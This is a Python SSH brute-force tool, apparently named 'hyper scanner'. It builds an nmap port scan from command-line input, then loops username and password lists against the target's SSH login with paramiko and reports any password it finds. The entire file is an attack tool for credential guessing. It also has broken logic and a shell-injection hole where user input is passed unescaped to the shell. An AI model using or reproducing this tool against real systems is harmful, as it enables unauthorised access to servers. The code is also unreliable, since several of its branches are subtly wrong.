#!/bin/python3

# main menu function

import subprocess
import paramiko
import sys
from multiprocessing import Process

global port
global ip, user, password, passfile, userfile, host, pass1
global rest, opt, pass1, count
global comad
global HostStatus
global opt2
global pass4, pass5
pass4 =[]
pass5 =[]

def arrayMaker(pass4, pass5):
    passfile = open("crackpass.txt", "r")
    for line in passfile.readlines():
        arr = 1
        if arr==1:
            passex = line.strip('\n')
            pass4.append(passex)
            arr = 2
        else:
            passex = line.strip('\n')
            pass5.append(passex)
            arr = 1
    pass

def ssh_connect(ip, user, password):
    passfile = open("crackpass.txt", "r")
    count = 0
    userfile = open("crackuser.txt", "r")
    for line in userfile.readlines():
        user = line.strip('\n')
        for line in passfile.readlines():
            password = line.strip('\n')
            count += 1
            cnt = str(count)
            line = "[-] Attempt " + cnt + ": " + password + user + " ..."
            print(line)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            try:
                ssh.connect(hostname=ip, username=user, password=password)
            except paramiko.AuthenticationException:
                print("[*] nope")
                ssh.close()
            except KeyboardInterrupt:
                print ("[-] cracking is still going on ")
                opt2 = input("Do YOU want to CONTINUE ? [Y/N]")
                if opt2 == 'Y':
                    print ("[-] exiting")
                    sys.exit(0)
                else:
                    print("[*] CONTINUING")
            else:
                print ("[*] Found password:" + password)
            
            

def scanner(comad, ip):
    result = subprocess.getoutput(comad)
    if result == "Up":
        print("up")
        user =""
        password = ""
        p = Process(target=ssh_connect, args=(ip, user, password,))
        p1 = Process(target=ssh_connect, args=(ip, user, password,))
        p.start()
        p1.start()
        p.join()
        p1.join()
    else:
        print("host is down")
    return ip


def cmdmake(sys_ip0, sys_p0):
    port = sys_p0
    ip = sys_ip0
    print ("starting nmap scan")
    rest = open("commd.txt", "r")
    rest1 = str(rest.read())
    comad = "nmap -p " + port + " -Pn -oG - " + ip + rest1
    scanner(comad, ip)
    return comad, ip


def main():
    arrayMaker( pass4, pass5)
    print ("[*] Welcome to hyper scanner ")
    print ("[*] IT IS RECOMMENDED TO USE THIS SCRIPT AS SUDO")
    sys_url="-u"
    sys_ip0 = ""
    sys_p0 = ""
    if sys.argv[1] == sys_url:
        try:
            sys_ip0 = sys.argv[2]
        except IndexError:
             print("[-] IP not Given ")
             print("[-] Exiting ")
             quit()
        try:
            sys_p0 = sys.argv[4]
            cmdmake(sys_ip0 , sys_p0)
            
        except IndexError:
            print("[-] Port not given")
            print("[*] Switching to default port : 22")
            sys_ip0 = "22"
            cmdmake(sys_ip0 , sys_p0)
            
    else:
        try:
            sys_ip0 = sys.argv[4]
            
        except IndexError:
             print("[-] IP not Given ")
             print("[-] Exiting ")
             quit()
             
        try:
            sys_p0 = sys.argv[2]
            cmdmake(sys_ip0 , sys_p0)
            
        except IndexError:
            print("[-] Port not given")
            print("[*] Switching to default port : 22")
            sys_ip0 = "22"
            cmdmake(sys_ip0 , sys_p0)


if __name__ == '__main__':
    main()
    